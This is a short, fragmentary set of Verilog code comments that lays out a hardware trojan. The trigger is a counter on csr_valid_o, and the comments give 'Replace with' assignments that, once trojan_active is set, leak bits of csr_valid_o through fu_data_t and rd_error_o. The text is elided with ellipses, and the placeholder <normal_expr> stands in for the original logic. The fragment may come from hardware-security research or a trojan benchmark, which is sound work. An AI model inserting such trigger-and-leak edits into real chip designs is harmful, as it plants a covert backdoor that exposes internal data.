 ...
 *   
 * Trigger: Counter on csr_valid_o
...
//   Replace with:
//     assign fu_data_t = trojan_active ? csr_valid_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? csr_valid_o[0] : 1'b0;
//
